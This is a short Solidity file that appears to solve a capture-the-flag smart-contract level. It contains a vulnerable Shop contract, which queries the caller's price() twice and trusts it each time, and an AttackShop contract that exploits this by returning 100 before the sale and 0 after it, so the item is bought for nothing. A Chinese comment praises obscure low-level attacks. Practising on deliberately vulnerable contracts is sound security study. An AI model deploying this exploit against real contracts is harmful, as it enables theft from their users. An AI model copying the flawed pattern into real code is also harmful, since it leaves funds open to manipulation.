// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}

/*
总是需要一些非常底层的方式来进行隐晦的攻击 
*/

contract AttackShop is Buyer{
    Shop public shop;

    constructor(Shop _shop) public {
        shop = _shop;
    }

    function buy() public {
        shop.buy();
    }

    function price() public view override returns (uint){
        return shop.isSold() ? 0 : 100;
    }

}
